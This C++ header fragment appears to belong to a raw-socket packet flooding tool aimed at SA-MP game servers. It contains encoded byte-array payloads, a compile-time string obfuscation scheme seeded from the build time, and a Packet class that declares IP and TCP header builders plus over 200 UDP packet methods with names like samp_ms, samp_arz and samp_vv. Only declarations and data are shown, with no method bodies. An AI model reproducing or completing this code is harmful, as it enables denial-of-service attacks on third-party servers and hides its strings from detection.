	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xd2\xb9\xf4\x7f\x14\xf4\xcc\xbc\x97\xb6\x11\x97\x59\x4c\x97\xbc\x84\xb9\xcf\x7f\x08\xb9\x59\xa5\x97\xa5\x14\x61\x26\xf4\x26\x6a\x14\xb6\xc7\x62\x6a\x3a\x26\x61",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\x11\xb6\x84\x62\xf4\x4c\x26\x7f\xe1\xbc\x08\x29\x1b\xa5\x6a\xf4\xe1\xf4\xc7\x6a\x59\x8b\xe1\x3a\xd2\x6a\xd2\xa5\x6a\x8b\x08\xb9\xcf\xa5\xcf\x97\xd2\xbc\xf4\xbc",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xe1\x4c\x1b\x61\xcf\x8b\x26\x7f\xe1\xa5\x6a\xf4\x59\xbc\xd2\xa5\xc7\x29\xd2\x62\x1b\xa5\x11\xb6\xcc\xb9\x11\x62\xf4\x6a\x97\xa5\xcc\xc7\x6a\xc7\xcc\x6a\xc7\x29",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\x59\xcf\x8b\xc7\x7f\x1b\x3a\x97\xb9\xcf\xf4\xc7\xf4\x26\xb6\xc7\x62\x97\xc7\x59\xc7\xcf\x97\x11\x59\x3a\x61\x6a\xbc\xe1\x97\xd2\xb9\x6a\xb9\xcc\x4c\x3a\xf4",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\x97\x26\x4c\xcc\x8b\x97\xb6\x14\x7f\xcf\x29\xc7\x59\x97\x3a\xcf\x3a\x11\xb6\xc7\xa5\x59\xf4\xcf\xf4\x59\x29\x1b\x6a\x26\x97\x08\x8b\x14\xa5\x59\x61\x3a\x62",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x84\x6a\x1b\x4c\x1b\x6a\x1b\xf4\x3a\x97\x08\x3a\x97\x3a\x3a\x3a\x08\x6a\xe1\xb6\xd2\x62\xe1\x3a\xf4\x62\xcc\xa5\x1b\x29\x84\xf4\x59\xbc\xc7\x97\x6a\x7f\x1b\x29",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x59\xe1\x7f\x59\x6a\x11\x62\x84\x62\x11\xf4\xd2\x62\xc7\x61\xe1\x6a\x59\xa5\x3a\x62\x26\xb9\xcc\x6a\x08\x97\x97\xa5\x84\x6a\x14\x29\x3a\x97\x08\x29\xcf\x7f",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\xb6\xc7\x6a\x08\x59\x1b\x4c\x97\xa5\x11\xf4\x14\x61\xe1\xc7\x3a\x62\x08\xb9\xcf\xc7\x3a\xbc\x59\xc7\x6a\x7f\xf4\x6a\xf4\xf4\x1b\x7f\x26\xbc\xf4\x29\x97\x4c",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xe1\x7f\x14\x97\x6a\x7f\x97\xc7\xe1\x4c\x08\x97\x11\x7f\xcc\x62\xe1\x97\xe1\x6a\xc7\x8b\xf4\xb9\x11\x4c\x3a\x6a\x84\xbc\x11\x4c\xf4\x59\xf4\x6a\xf4\x29\xc7\x59",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\xbc\x08\xb6\x3a\x8b\x84\x3a\x3a\x97\x14\x6a\x11\x61\xc7\xb6\xc7\x6a\xd2\xb6\x84\xb6\x6a\xb9\x1b\xf4\x59\xb9\xcc\xa5\x84\xb6\x97\x4c\x26\xc7\x97\x8b\xcf\x97",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\x29\x3a\x7f\x14\x97\x3a\x61\xd2\x8b\xd2\x59\xcf\x7f\x26\xa5\x26\x29\x84\x8b\xcc\xc7\xe1\x61\x3a\x62\xe1\x29\x3a\xa5\xcc\xc7\xe1\xc7\x59\x59\x08\xc7\x1b\xf4",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\xcc\x3a\x26\x6a\x11\xb6\xc7\x97\x14\x62\xcc\x4c\x6a\x29\x1b\xb6\x59\xbc\xe1\xa5\xd2\x29\x08\xb9\x1b\xf4\x26\xb9\x6a\xf4\xf4\x8b\x6a\x8b\x11\xb9\x59\x8b\x6a\x97",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\x62\xd2\xbc\x08\xc7\x84\x29\x08\xbc\x97\x6a\xcf\xbc\x26\xf4\xc7\xb6\x59\xa5\xc7\x62\xf4\x62\x11\xb6\x08\xb9\x1b\x97\x26\xf4\x08\x4c\xd2\x62\x1b\x59\xc7\xf4",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\xb9\x84\xc7\xf4\xa5\xf4\xb6\x97\x59\x3a\xa5\x6a\xb6\x26\x6a\x84\x6a\x14\xb9\x3a\x59\x26\x97\x97\xb6\x97\xbc\x59\x62\xcc\x6a\x11\x8b\x14\x61\x84\x6a\x97\x29",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x6a\xc7\x97\xc7\x14\x3a\x1b\x3a\x14\x61\x6a\x62\xcf\x29\xe1\xb6\xcf\x8b\xcc\x3a\x6a\xbc\x1b\xa5\xf4\xbc\x84\x3a\x26\xf4\xf4\xbc\x3a\x8b\x14\x97\x6a\x3a\xd2\x62",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\xa5\x1b\x6a\x08\xb9\xe1\x59\xcc\x8b\x08\x62\x97\x61\x97\x59\x3a\xc7\x14\x97\xf4\x61\x84\x97\xe1\xbc\x3a\xc7\xd2\xbc\x11\x4c\x08\x6a\xe1\x97\xf4\x59\xcf\x61",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xd2\xbc\xcc\xb9\xf4\x61\x59\x4c\xcf\xb6\x14\xb9\x97\x3a\x26\x4c\x59\x61\x84\xbc\xf4\x97\xd2\xc7\x59\xa5\x59\x4c\x26\x29\xcf\x8b\x14\xa5\x3a\x7f\x26\x97\x3a\xc7",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\x1b\xbc\xc7\xb9\xf4\x8b\x1b\x59\x84\xc7\xcf\x59\xcf\x6a\x1b\xbc\xcc\xa5\x59\x8b\x84\xb6\xe1\x3a\x08\x62\xcc\xb9\x08\x3a\xc7\x7f\xd2\x6a\x26\x6a\x1b\x6a\x6a\x62",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x8b\x26\x6a\x97\xbc\x08\x97\x6a\x7f\xd2\x97\x97\x4c\xf4\x29\xc7\x6a\x26\xbc\x84\x61\xcf\xb6\x59\xb9\xc7\x59\x84\xa5\xc7\x4c\x08\xbc\xf4\xb6\xc7\x3a\x84\x4c",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x08\xbc\x1b\x4c\x1b\xb9\x97\x97\xf4\x4c\x59\x97\x97\xc7\xd2\x6a\xd2\x7f\xf4\x6a\xe1\xbc\x14\xf4\x14\x29\x59\x6a\x1b\xbc\xe1\xbc\x26\xb6\x6a\x6a\x26\xb6\xc7\xbc",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\x14\x62\x6a\x7f\xe1\x97\xc7\xb6\x3a\x59\xc7\x97\x1b\xb6\xcf\xa5\xc7\xb6\x26\x7f\xcc\x29\xf4\xb6\x84\x4c\xe1\x61\x6a\x6a\x97\xf4\x6a\xb9\x59\x7f\x6a\x6a\x14\x29",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\xc7\x6a\x7f\x26\x4c\x59\x62\x84\x62\xd2\xb6\xe1\x59\x3a\xb9\x1b\x62\x08\xbc\x6a\xa5\x1b\x29\xc7\x62\x97\x4c\x08\x6a\x6a\x4c\x97\xc7\x3a\x6a\x11\xa5\x08\xb6",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\xd2\x29\x84\xc7\xcf\x3a\xcc\x97\x14\xf4\x97\xa5\xc7\x29\x14\xb6\xe1\x4c\xd2\xb6\x08\x29\xc7\xb6\xc7\xbc\x1b\xbc\x84\xa5\xcf\x4c\x1b\x7f\x26\xbc\x08\xc7\x84\xb9",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xcf\x97\xf4\xbc\xd2\x4c\x1b\x8b\x1b\xb6\x11\x4c\xcc\x61\x6a\x59\x14\x3a\x26\x4c\x3a\x97\xcc\xb9\xcf\xc7\xcf\x62\x3a\x29\x97\xa5\x6a\x97\xf4\xf4\x11\x29\x97\x29",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\x61\xcc\x4c\xcc\x62\x84\x6a\x08\xbc\xf4\x59\xd2\x8b\x97\xb9\x3a\x8b\x1b\xc7\xe1\x97\x59\x4c\xc7\x29\xf4\x6a\x3a\x6a\x26\x29\x14\x7f\x1b\x3a\x59\x29\x97\xb9",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\x29\x26\x3a\x08\x7f\x26\x59\x14\x59\xcc\x97\x08\xc7\x26\xb9\xd2\x4c\x3a\xf4\x14\xf4\x97\x6a\x1b\xb6\x3a\xbc\xcf\x29\x6a\x59\xcf\xa5\xc7\x6a\xf4\x61\x11\xbc",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\xc7\x1b\x4c\x08\x3a\x26\xbc\x14\xb6\x1b\xbc\x6a\xb9\x26\xc7\x59\x4c\x14\xb6\xf4\x59\xc7\xb9\xe1\xb9\xcf\x61\x59\xf4\xe1\x62\x11\x97\x6a\xb6\xe1\x3a\xcc\x29",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x1b\xa5\x3a\x4c\x59\x3a\x59\xb9\x11\x3a\x08\x4c\x6a\xc7\xe1\x59\xcf\x62\x6a\xb9\xcc\xa5\xf4\x29\xc7\x7f\xcf\xc7\xf4\x62\x6a\x97\x14\x59\x11\xc7\x14\xf4\x14\x97",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\x08\x59\x59\x7f\xe1\x61\x59\x97\x1b\xbc\xe1\x8b\xe1\x3a\x84\x7f\x11\x97\x14\xc7\x26\x62\xcf\x6a\x3a\x7f\x59\x59\xd2\x29\xf4\x62\x97\xf4\x11\x97\x3a\xa5\x97\xf4",
	"\x20\x27\xd8\x11\x4d\xfd\x0e\x7a\x84\x59\x1b\x62\xd2\x61\xcf\x62\xcc\xb6\xc7\xb9\x97\xa5\xcc\xb6\x08\xb6\xd2\x59\x08\x62\xf4\xc7\x26\x3a\x1b\xb6\x97\xa5\x11\x6a\x6a\xc7\x26\xb6\xcf\xf4\xcf\x8b",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x1b\x7f\x97\xb9\x84\xa5\x11\xbc\x59\xa5\xcf\x8b\xf4\x29\x11\x59\x08\xf4\x1b\x8b\x1b\x61\x26\x61\x3a\x62\xcf\x29\xcf\x7f\x3a\x97\xe1\xbc\x11\x4c\x11\x29\xc7\x7f",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\xb9\x08\x8b\xcf\xb9\x11\x59\xf4\x62\x14\x6a\x1b\xbc\x1b\xbc\x1b\xf4\x6a\xf4\x14\xa5\x26\x3a\xcf\xf4\x6a\x29\xcf\xc7\x14\xa5\x08\xf4\xe1\xf4\xcf\xc7\x59\x59",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\xcc\x62\x6a\x8b\x84\xa5\x6a\x97\x84\x59\x97\xbc\xcc\x97\x26\xbc\x26\x62\xd2\x6a\x14\x7f\xe1\x97\xcf\xa5\x97\x4c\xd2\x59\x26\x62\xc7\xc7\x1b\x59\xcf\x8b\x08\xc7",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\x62\x11\x62\x59\x62\x11\x29\xc7\xf4\xcc\x97\x6a\x59\xe1\x62\x11\x6a\xcf\xb6\x3a\xf4\x6a\xbc\xd2\xa5\xcf\x4c\x26\xc7\x84\xf4\x1b\x7f\xc7\xbc\xd2\xc7\xcc\xb9",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\xcf\x6a\xd2\x59\x59\x97\x11\x62\x84\x7f\xd2\x29\xd2\x7f\x26\x4c\x11\xf4\xc7\x59\x11\x8b\xcc\x97\x84\xbc\x84\xc7\xe1\xb6\x1b\x62\x14\x62\x08\x61\x3a\x7f\x11\xb6",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x59\x8b\xc7\x7f\x59\x4c\x1b\xb9\xcc\xa5\x3a\x29\x6a\xf4\xd2\x8b\xcf\xf4\x97\x61\xcc\x7f\xcf\xf4\xf4\x6a\x14\x4c\x1b\x4c\xd2\xb6\xe1\xb9\xc7\xb9\x11\x61\xf4\x61",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\xbc\x84\x97\x3a\x62\x08\x4c\x08\x97\xf4\x4c\x14\xb9\x1b\x6a\x1b\x7f\x97\x8b\xf4\x7f\xd2\x29\x97\x29\x11\xb9\x3a\x59\x6a\x61\x1b\xb9\x6a\xb9\x84\x62\x08\x61",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\xcf\x3a\x59\xb9\x08\x3a\xcf\x97\x3a\xb6\x1b\x61\x1b\x29\x08\x6a\x6a\x61\x3a\xbc\x14\x4c\xe1\xc7\x11\xf4\xe1\xb6\x3a\xbc\x26\x8b\x14\x8b\x11\x7f\x1b\xb6\x26\xa5",
	"\x20\x27\xd8\x11\x4d\xfd\x0e\x7a\x6a\x6a\x3a\x8b\x14\x61\x84\x61\x26\xb9\x08\xbc\x14\x6a\x59\xf4\xe1\xb9\x6a\xa5\x11\x6a\x59\x59\x84\x62\xe1\x7f\xcf\x4c\xcc\x8b\x3a\xf4\x14\x62\xc7\x29\xd2\x62",
	"\x20\x27\xd8\x11\x4d\xfd\x0e\x7a\x1b\x7f\x1b\x4c\x1b\x97\x26\xc7\x97\xf4\x59\x62\x08\xb9\x08\x6a\x26\x62\x1b\x97\x3a\x29\xd2\xa5\xcc\x8b\x84\xc7\xd2\xb9\x26\xa5\xd2\x59\x3a\x3a\x97\x7f\xcc\x59",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\xb9\xc7\x3a\xc7\x6a\x97\x7f\x97\x4c\x14\xb6\x1b\x7f\xc7\xf4\x59\x4c\x11\xbc\x08\xb9\x84\x7f\xd2\x62\x84\x3a\x3a\x8b\xf4\x97\x6a\xbc\xc7\x97\x97\x6a\xd2\xb6",
};

namespace snowapril 
{
	constexpr int RandomSeed(void) 
	{
		return '0' * -40271 + // offset accounting for digits' ANSI offsets
			__TIME__[7] * 1 +
			__TIME__[6] * 10 +
			__TIME__[4] * 60 +
			__TIME__[3] * 600 +
			__TIME__[1] * 3600 +
			__TIME__[0] * 36000;
	};
	template <unsigned int a,
		unsigned int c,
		unsigned int seed,
		unsigned int Limit>
		struct LinearCongruentialEngine 
	{
		enum { value = (a * LinearCongruentialEngine<a, c - 1, seed, Limit>::value + c) % Limit };
	};
	template <unsigned int a,
		unsigned int seed,
		unsigned int Limit>
		struct LinearCongruentialEngine<a, 0, seed, Limit> 
	{
		enum { value = (a * seed) % Limit };
	};
	template <int N, int Limit>
	struct MetaRandom 
	{
		enum { value = LinearCongruentialEngine<16807, N, RandomSeed(), Limit>::value };
	};
}

namespace snowapril 
{
	template <int A, int B>
	struct ExtendedEuclidian 
	{
		enum 
		{
			d = ExtendedEuclidian<B, A% B>::d,
			x = ExtendedEuclidian<B, A% B>::y,
			y = ExtendedEuclidian<B, A% B>::x - (A / B) * ExtendedEuclidian<B, A% B>::y
		};
	};
	template <int A>
	struct ExtendedEuclidian<A, 0> 
	{
		enum 
		{
			d = A,
			x = 1,
			y = 0
		};
	};
	constexpr std::array<int, 30> PrimeNumbers = 
	{
		2, 3, 5, 7, 11, 13, 17, 19, 23, 29,
		31, 37, 41, 43, 47, 53, 59, 61, 67,
		71, 73, 79, 83, 89, 97, 101, 103,
		107, 109, 113
	};
	constexpr int positive_modulo(int a, int n) 
	{
		return (a % n + n) % n;
	}
	template <typename Indexes, int A, int B>
	class MetaString;
	template <size_t... I, int A, int B>
	class MetaString<std::index_sequence<I...>, A, B> 
	{
	public:
		constexpr MetaString(char const* str)
			: encrypted_buffer{ encrypt(str[I])... } {};
	public:
		inline const char* decrypt(void) {
			for (size_t i = 0; i < sizeof...(I); ++i) {
				buffer[i] = decrypt(encrypted_buffer[i]);
			}
			buffer[sizeof...(I)] = 0;
			return buffer;
		}
	private:
		constexpr int  encrypt(char c) const { return (A * c + B) % 127; };
		constexpr char decrypt(int c) const { return positive_modulo(ExtendedEuclidian<127, A>::y * (c - B), 127); };
	private:
		char buffer[sizeof...(I) + 1]{};
		int  encrypted_buffer[sizeof...(I)]{};
	};
}

#define TEST(str) (snowapril::MetaString<std::make_index_sequence<sizeof(str) - 1>, \
					      std::get<snowapril::MetaRandom<__COUNTER__, 30>::value>(snowapril::PrimeNumbers), \
					      snowapril::MetaRandom<__COUNTER__, 126>::value>(str))

#define OBFUSCATE(str) (snowapril::MetaString<std::make_index_sequence<sizeof(str) - 1>, \
					      std::get<snowapril::MetaRandom<__COUNTER__, 30>::value>(snowapril::PrimeNumbers), \
					      snowapril::MetaRandom<__COUNTER__, 126>::value>(str).decrypt())

class Packet
{
public:
	void ip_header(struct iphdr* iph);
	void iptcp_header(struct iphdr *iphtcp);
	void samp_type1(struct iphdr* iph, struct udphdr* udph);
	void samp_type2(struct iphdr* iph, struct udphdr* udph);
	void samp_type3(struct iphdr* iph, struct udphdr* udph);
	void samp_type4(struct iphdr* iph, struct udphdr* udph);
	void samp_type5(struct iphdr* iph, struct udphdr* udph);
	void samp_type6(struct iphdr* iph, struct udphdr* udph);
	void samp_type7(struct iphdr* iph, struct udphdr* udph);
	void samp_type8(struct iphdr* iph, struct udphdr* udph);
	void samp_type9(struct iphdr* iph, struct udphdr* udph);
	void samp_type10(struct iphdr* iph, struct udphdr* udph);
	void samp_type11(struct iphdr* iph, struct udphdr* udph);
	void samp_type12(struct iphdr* iph, struct udphdr* udph);
	void samp_type13(struct iphdr* iph, struct udphdr* udph);
	void samp_type14(struct iphdr* iph, struct udphdr* udph);
	void samp_type15(struct iphdr* iph, struct udphdr* udph);
	void samp_type16(struct iphdr* iph, struct udphdr* udph);
	void samp_type17(struct iphdr* iph, struct udphdr* udph);
	void samp_type18(struct iphdr* iph, struct udphdr* udph);
	void samp_ms(struct iphdr* iph, struct udphdr* udph);
	void samp_ms2(struct iphdr* iph, struct udphdr* udph);
	void samp_ms3(struct iphdr* iph, struct udphdr* udph);
	void samp_ms4(struct iphdr* iph, struct udphdr* udph);
	void samp_ms5(struct iphdr* iph, struct udphdr* udph);
	void samp_ms6(struct iphdr* iph, struct udphdr* udph);
	void samp_ms7(struct iphdr* iph, struct udphdr* udph);
	void samp_ms8(struct iphdr* iph, struct udphdr* udph);
	void samp_ms9(struct iphdr* iph, struct udphdr* udph);
	void samp_ms10(struct iphdr* iph, struct udphdr* udph);
	void samp_ms11(struct iphdr* iph, struct udphdr* udph);
	void samp_ms12(struct iphdr* iph, struct udphdr* udph);
	void samp_ms13(struct iphdr* iph, struct udphdr* udph);
	void samp_ms14(struct iphdr* iph, struct udphdr* udph);
	void samp_ms15(struct iphdr* iph, struct udphdr* udph);
	void samp_ms16(struct iphdr* iph, struct udphdr* udph);
	void samp_ms17(struct iphdr* iph, struct udphdr* udph);
	void samp_ms18(struct iphdr* iph, struct udphdr* udph);
	void samp_ms19(struct iphdr* iph, struct udphdr* udph);
	void samp_ms20(struct iphdr* iph, struct udphdr* udph);
	void samp_ms21(struct iphdr* iph, struct udphdr* udph);
	void samp_ms22(struct iphdr* iph, struct udphdr* udph);
	void samp_ms23(struct iphdr* iph, struct udphdr* udph);
	void samp_ms24(struct iphdr* iph, struct udphdr* udph);
	void samp_ms25(struct iphdr* iph, struct udphdr* udph);
	void samp_ms26(struct iphdr* iph, struct udphdr* udph);
	void samp_ms27(struct iphdr* iph, struct udphdr* udph);
	void samp_ms28(struct iphdr* iph, struct udphdr* udph);
	void samp_ms29(struct iphdr* iph, struct udphdr* udph);
	void samp_ms30(struct iphdr* iph, struct udphdr* udph);
	void samp_ms31(struct iphdr* iph, struct udphdr* udph);
	void samp_ms32(struct iphdr* iph, struct udphdr* udph);
	void samp_arz1(struct iphdr* iph, struct udphdr* udph);
	void samp_arz2(struct iphdr* iph, struct udphdr* udph);
	void samp_arz3(struct iphdr* iph, struct udphdr* udph);
	void samp_arz4(struct iphdr* iph, struct udphdr* udph);
	void samp_arz5(struct iphdr* iph, struct udphdr* udph);
	void samp_arz6(struct iphdr* iph, struct udphdr* udph);
	void samp_arz7(struct iphdr* iph, struct udphdr* udph);
	void samp_arz8(struct iphdr* iph, struct udphdr* udph);
	void samp_arz9(struct iphdr* iph, struct udphdr* udph);
	void samp_arz10(struct iphdr* iph, struct udphdr* udph);
	void samp_arz11(struct iphdr* iph, struct udphdr* udph);
	void samp_arz12(struct iphdr* iph, struct udphdr* udph);
	void samp_arz13(struct iphdr* iph, struct udphdr* udph);
	void samp_arz14(struct iphdr* iph, struct udphdr* udph);
	void samp_arz15(struct iphdr* iph, struct udphdr* udph);
	void samp_arz16(struct iphdr* iph, struct udphdr* udph);
	void samp_arz17(struct iphdr* iph, struct udphdr* udph);
	void samp_arz18(struct iphdr* iph, struct udphdr* udph);
	void samp_arz19(struct iphdr* iph, struct udphdr* udph);
	void samp_arz20(struct iphdr* iph, struct udphdr* udph);
	void samp_arz21(struct iphdr* iph, struct udphdr* udph);
	void samp_arz22(struct iphdr* iph, struct udphdr* udph);
	void samp_arz23(struct iphdr* iph, struct udphdr* udph);
	void samp_arz24(struct iphdr* iph, struct udphdr* udph);
	void samp_arz25(struct iphdr* iph, struct udphdr* udph);
	void samp_arz26(struct iphdr* iph, struct udphdr* udph);
	void samp_arz27(struct iphdr* iph, struct udphdr* udph);
	void samp_arz28(struct iphdr* iph, struct udphdr* udph);
	void samp_arz29(struct iphdr* iph, struct udphdr* udph);
	void samp_arz30(struct iphdr* iph, struct udphdr* udph);
	void samp_arz31(struct iphdr* iph, struct udphdr* udph);
	void samp_arz32(struct iphdr* iph, struct udphdr* udph);
	void samp_arz33(struct iphdr* iph, struct udphdr* udph);
	void samp_arz34(struct iphdr* iph, struct udphdr* udph);
	void samp_arz35(struct iphdr* iph, struct udphdr* udph);
	void samp_arz36(struct iphdr* iph, struct udphdr* udph);
	void samp_arz37(struct iphdr* iph, struct udphdr* udph);
	void samp_arz38(struct iphdr* iph, struct udphdr* udph);
	void samp_arz39(struct iphdr* iph, struct udphdr* udph);
	void samp_arz40(struct iphdr* iph, struct udphdr* udph);
	void samp_arz41(struct iphdr* iph, struct udphdr* udph);
	void samp_arz42(struct iphdr* iph, struct udphdr* udph);
	void samp_arz43(struct iphdr* iph, struct udphdr* udph);
	void samp_arz44(struct iphdr* iph, struct udphdr* udph);
	void samp_arz45(struct iphdr* iph, struct udphdr* udph);
	void samp_m1(struct iphdr* iph, struct udphdr* udph);
	void samp_m2(struct iphdr* iph, struct udphdr* udph);
	void samp_m3(struct iphdr* iph, struct udphdr* udph);
	void samp_m4(struct iphdr* iph, struct udphdr* udph);
	void samp_pp1(struct iphdr* iph, struct udphdr* udph);
	void samp_pp2(struct iphdr* iph, struct udphdr* udph);
	void samp_pp3(struct iphdr* iph, struct udphdr* udph);
	void samp_pp4(struct iphdr* iph, struct udphdr* udph);
	void samp_pp5(struct iphdr* iph, struct udphdr* udph);
	void samp_pp6(struct iphdr* iph, struct udphdr* udph);
	void samp_pp7(struct iphdr* iph, struct udphdr* udph);
	void samp_pp8(struct iphdr* iph, struct udphdr* udph);
	void samp_pp9(struct iphdr* iph, struct udphdr* udph);
	void samp_pp10(struct iphdr* iph, struct udphdr* udph);
	void samp_pp11(struct iphdr* iph, struct udphdr* udph);
	void samp_pp12(struct iphdr* iph, struct udphdr* udph);
	void samp_pp13(struct iphdr* iph, struct udphdr* udph);
	void samp_pp14(struct iphdr* iph, struct udphdr* udph);
	void samp_pp15(struct iphdr* iph, struct udphdr* udph);
	void samp_pp16(struct iphdr* iph, struct udphdr* udph);
	void samp_pp17(struct iphdr* iph, struct udphdr* udph);
	void samp_pp18(struct iphdr* iph, struct udphdr* udph);
	void samp_pp19(struct iphdr* iph, struct udphdr* udph);
	void samp_pp20(struct iphdr* iph, struct udphdr* udph);
	void samp_pp21(struct iphdr* iph, struct udphdr* udph);
	void samp_pp22(struct iphdr* iph, struct udphdr* udph);
	void samp_pp23(struct iphdr* iph, struct udphdr* udph);
	void samp_pp24(struct iphdr* iph, struct udphdr* udph);
	void samp_pp25(struct iphdr* iph, struct udphdr* udph);
	void samp_pp26(struct iphdr* iph, struct udphdr* udph);
	void samp_pp27(struct iphdr* iph, struct udphdr* udph);
	void samp_pp28(struct iphdr* iph, struct udphdr* udph);
	void samp_pp29(struct iphdr* iph, struct udphdr* udph);
	void samp_pp30(struct iphdr* iph, struct udphdr* udph);
	void samp_aa1(struct iphdr* iph, struct udphdr* udph);
	void samp_aa2(struct iphdr* iph, struct udphdr* udph);
	void samp_aa3(struct iphdr* iph, struct udphdr* udph);
	void samp_aa4(struct iphdr* iph, struct udphdr* udph);
	void samp_aa5(struct iphdr* iph, struct udphdr* udph);
	void samp_aa6(struct iphdr* iph, struct udphdr* udph);
	void samp_aa7(struct iphdr* iph, struct udphdr* udph);
	void samp_aa8(struct iphdr* iph, struct udphdr* udph);
	void samp_aa9(struct iphdr* iph, struct udphdr* udph);
	void samp_aa10(struct iphdr* iph, struct udphdr* udph);
	void samp_aa11(struct iphdr* iph, struct udphdr* udph);
	void samp_aa12(struct iphdr* iph, struct udphdr* udph);
	void samp_aa13(struct iphdr* iph, struct udphdr* udph);
	void samp_aa14(struct iphdr* iph, struct udphdr* udph);
	void samp_aa15(struct iphdr* iph, struct udphdr* udph);
	void samp_aa16(struct iphdr* iph, struct udphdr* udph);
	void samp_aa17(struct iphdr* iph, struct udphdr* udph);
	void samp_aa18(struct iphdr* iph, struct udphdr* udph);
	void samp_aa19(struct iphdr* iph, struct udphdr* udph);
	void samp_aa20(struct iphdr* iph, struct udphdr* udph);
	void samp_aa21(struct iphdr* iph, struct udphdr* udph);
	void samp_aa22(struct iphdr* iph, struct udphdr* udph);
	void samp_aa23(struct iphdr* iph, struct udphdr* udph);
	void samp_aa24(struct iphdr* iph, struct udphdr* udph);
	void samp_aa25(struct iphdr* iph, struct udphdr* udph);
	void samp_aa26(struct iphdr* iph, struct udphdr* udph);
	void samp_tt1(struct iphdr* iph, struct udphdr* udph);
	void samp_tt2(struct iphdr* iph, struct udphdr* udph);
	void samp_tt3(struct iphdr* iph, struct udphdr* udph);
	void samp_tt4(struct iphdr* iph, struct udphdr* udph);
	void samp_tt5(struct iphdr* iph, struct udphdr* udph);
	void samp_tt6(struct iphdr* iph, struct udphdr* udph);
	void samp_tt7(struct iphdr* iph, struct udphdr* udph);
	void samp_tt8(struct iphdr* iph, struct udphdr* udph);
	void samp_tt9(struct iphdr* iph, struct udphdr* udph);
	void samp_tt10(struct iphdr* iph, struct udphdr* udph);
	void samp_tt11(struct iphdr* iph, struct udphdr* udph);
	void samp_tt12(struct iphdr* iph, struct udphdr* udph);
	void samp_tt13(struct iphdr* iph, struct udphdr* udph);
	void samp_tt14(struct iphdr* iph, struct udphdr* udph);
	void samp_tt15(struct iphdr* iph, struct udphdr* udph);
	void samp_tt16(struct iphdr* iph, struct udphdr* udph);
	void samp_tt17(struct iphdr* iph, struct udphdr* udph);


	void samp_vv1(struct iphdr* iph, struct udphdr* udph);
	void samp_vv2(struct iphdr* iph, struct udphdr* udph);
	void samp_vv3(struct iphdr* iph, struct udphdr* udph);
	void samp_vv4(struct iphdr* iph, struct udphdr* udph);
	void samp_vv5(struct iphdr* iph, struct udphdr* udph);
	void samp_vv6(struct iphdr* iph, struct udphdr* udph);
	void samp_vv7(struct iphdr* iph, struct udphdr* udph);
	void samp_vv8(struct iphdr* iph, struct udphdr* udph);
	void samp_vv9(struct iphdr* iph, struct udphdr* udph);
	void samp_vv10(struct iphdr* iph, struct udphdr* udph);
	void samp_vv11(struct iphdr* iph, struct udphdr* udph);
	void samp_vv12(struct iphdr* iph, struct udphdr* udph);
	void samp_vv13(struct iphdr* iph, struct udphdr* udph);
	void samp_vv14(struct iphdr* iph, struct udphdr* udph);
	void samp_vv15(struct iphdr* iph, struct udphdr* udph);
	void samp_vv16(struct iphdr* iph, struct udphdr* udph);
	void samp_vv17(struct iphdr* iph, struct udphdr* udph);
	void samp_vv18(struct iphdr* iph, struct udphdr* udph);
	void samp_vv19(struct iphdr* iph, struct udphdr* udph);
	void samp_vv20(struct iphdr* iph, struct udphdr* udph);
	void samp_vv21(struct iphdr* iph, struct udphdr* udph);
	void samp_vv22(struct iphdr* iph, struct udphdr* udph);
	void samp_vv23(struct iphdr* iph, struct udphdr* udph);
	void samp_vv24(struct iphdr* iph, struct udphdr* udph);
	void samp_vv25(struct iphdr* iph, struct udphdr* udph);
	void samp_vv26(struct iphdr* iph, struct udphdr* udph);
	void samp_vv27(struct iphdr* iph, struct udphdr* udph);
	void samp_vv28(struct iphdr* iph, struct udphdr* udph);
	void samp_vv29(struct iphdr* iph, struct udphdr* udph);
	void samp_vv30(struct iphdr* iph, struct udphdr* udph);
	void samp_vv31(struct iphdr* iph, struct udphdr* udph);
	void samp_vv32(struct iphdr* iph, struct udphdr* udph);
	void samp_vv33(struct iphdr* iph, struct udphdr* udph);
	void samp_vv34(struct iphdr* iph, struct udphdr* udph);
	void samp_vv35(struct iphdr* iph, struct udphdr* udph);
